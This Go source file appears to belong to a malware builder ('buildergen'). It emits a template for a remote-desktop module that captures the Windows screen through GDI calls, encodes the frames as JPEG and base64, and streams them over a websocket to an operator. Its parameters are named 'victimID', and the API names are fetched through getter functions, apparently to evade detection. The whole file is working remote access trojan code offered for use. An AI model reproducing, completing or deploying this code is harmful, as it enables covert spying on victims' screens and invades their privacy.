package buildergen

import "strings"

func templateRemoteDesktop() string {
	return strings.TrimSpace(`
var rdMu sync.Mutex
var rdStop chan struct{}
var rdRunning int32

type bitmapInfoHeader struct {
	BiSize          uint32
	BiWidth         int32
	BiHeight        int32
	BiPlanes        uint16
	BiBitCount      uint16
	BiCompression   uint32
	BiSizeImage     uint32
	BiXPelsPerMeter int32
	BiYPelsPerMeter int32
	BiClrUsed       uint32
	BiClrImportant  uint32
}

type rgbQuad struct {
	Blue     byte
	Green    byte
	Red      byte
	Reserved byte
}

type bitmapInfo struct {
	BmiHeader bitmapInfoHeader
	BmiColors [1]rgbQuad
}

const biRGB = 0

func captureScreen() ([]byte, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("remote desktop only supported on windows")
	}
	user32 := syscall.NewLazyDLL(getUser32DLL())
	gdi32 := syscall.NewLazyDLL(getGdi32DLL())
	getDesktopWindow := user32.NewProc(getGetDesktopWindowName())
	getDC := user32.NewProc(getGetDCName())
	createCompatibleDC := gdi32.NewProc(getCreateCompatibleDCName())
	createCompatibleBitmap := gdi32.NewProc(getCreateCompatibleBitmapName())
	selectObject := gdi32.NewProc(getSelectObjectName())
	bitBlt := gdi32.NewProc(getBitBltName())
	getDeviceCaps := gdi32.NewProc(getGetDeviceCapsName())
	deleteDC := gdi32.NewProc(getDeleteDCName())
	releaseDC := user32.NewProc(getReleaseDCName())
	deleteObject := gdi32.NewProc(getDeleteObjectName())

	hwnd, _, _ := getDesktopWindow.Call()
	hdc, _, _ := getDC.Call(hwnd)
	defer releaseDC.Call(hwnd, hdc)

	memDC, _, _ := createCompatibleDC.Call(hdc)
	defer deleteDC.Call(memDC)

	width, _, _ := getDeviceCaps.Call(hdc, 8)
	height, _, _ := getDeviceCaps.Call(hdc, 10)
	w := int(width)
	h := int(height)
	if w <= 0 || h <= 0 {
		return nil, fmt.Errorf("invalid screen size")
	}

	hBitmap, _, _ := createCompatibleBitmap.Call(hdc, uintptr(w), uintptr(h))
	defer deleteObject.Call(hBitmap)

	oldObj, _, _ := selectObject.Call(memDC, hBitmap)
	defer selectObject.Call(memDC, oldObj)

	bitBlt.Call(memDC, 0, 0, uintptr(w), uintptr(h), hdc, 0, 0, 0x00CC0020)

	var bmi bitmapInfo
	bmi.BmiHeader.BiSize = uint32(unsafe.Sizeof(bmi.BmiHeader))
	bmi.BmiHeader.BiWidth = int32(w)
	bmi.BmiHeader.BiHeight = -int32(h)
	bmi.BmiHeader.BiPlanes = 1
	bmi.BmiHeader.BiBitCount = 32
	bmi.BmiHeader.BiCompression = biRGB

	stride := (w*4 + 3) &^ 3
	buf := make([]byte, stride*h)
	_, _, _ = gdi32.NewProc(getGetDIBitsName()).Call(hdc, hBitmap, 0, uintptr(h), uintptr(unsafe.Pointer(&buf[0])), uintptr(unsafe.Pointer(&bmi)), 0)

	img := &image.RGBA{Pix: buf, Stride: int(stride), Rect: image.Rect(0, 0, w, h)}
	var out bytes.Buffer
	if err := jpeg.Encode(&out, img, &jpeg.Options{Quality: 75}); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func startRemoteDesktop(conn *websocket.Conn, victimID string, fps, resolutionPct int) {
	stopRemoteDesktop(conn, victimID)
	if !atomic.CompareAndSwapInt32(&rdRunning, 0, 1) {
		return
	}

	rdMu.Lock()
	rdStop = make(chan struct{})
	stopCh := rdStop
	rdMu.Unlock()

	go func() {
		defer atomic.StoreInt32(&rdRunning, 0)
		if fps <= 0 {
			fps = 30
		}
		interval := time.Second / time.Duration(fps)
		if interval <= 0 {
			interval = time.Second / 30
		}
		ticker := time.NewTicker(interval)
		defer ticker.Stop()

		for {
			select {
			case <-stopCh:
				return
			case <-ticker.C:
				data, err := captureScreen()
				if err != nil {
					continue
				}

				if resolutionPct > 0 && resolutionPct < 100 {
					img, _, err := image.Decode(bytes.NewReader(data))
					if err == nil {
						b := img.Bounds()
						nw := b.Dx() * resolutionPct / 100
						nh := b.Dy() * resolutionPct / 100
						if nw > 0 && nh > 0 {
							dst := image.NewRGBA(image.Rect(0, 0, nw, nh))
							draw.BiLinear.Scale(dst, dst.Bounds(), img, b, draw.Over, nil)
							var buf bytes.Buffer
							if err := jpeg.Encode(&buf, dst, &jpeg.Options{Quality: 75}); err == nil {
								data = buf.Bytes()
							}
						}
					}
				}

				b64 := base64.StdEncoding.EncodeToString(data)
				msg := map[string]interface{}{
					"type": "rd_frame",
					"data": b64,
				}
				if err := wsWriteJSON(conn, msg); err != nil {
					return
				}
			}
		}
	}()
}

func stopRemoteDesktop(conn *websocket.Conn, victimID string) {
	_ = conn
	_ = victimID
	rdMu.Lock()
	if rdStop != nil {
		close(rdStop)
		rdStop = nil
	}
	rdMu.Unlock()
	atomic.StoreInt32(&rdRunning, 0)
}
`)
}